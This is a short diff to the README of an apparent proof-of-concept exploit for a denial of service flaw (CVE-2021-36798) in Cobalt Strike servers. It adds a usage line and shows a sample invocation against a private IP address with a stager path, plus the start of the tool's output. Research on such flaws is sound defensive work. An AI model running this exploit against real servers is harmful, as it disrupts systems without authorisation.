@@ -3,6 +3,10 @@ A denial of service (DoS) vulnerability (CVE-2021-36798) was found in  Cobalt St
 ## Usage
 
 ```
+Usage: python3 CobaltStrike.py https://1.1.1.1<:443> <stager path>
+```
+
+```
 $ python3 CobaltStrikeDos.py https://192.168.1.3:4431 jquery-2.1.1.min.js
 [+] Try Get beacon configuration
 BeaconType                       - HTTPS
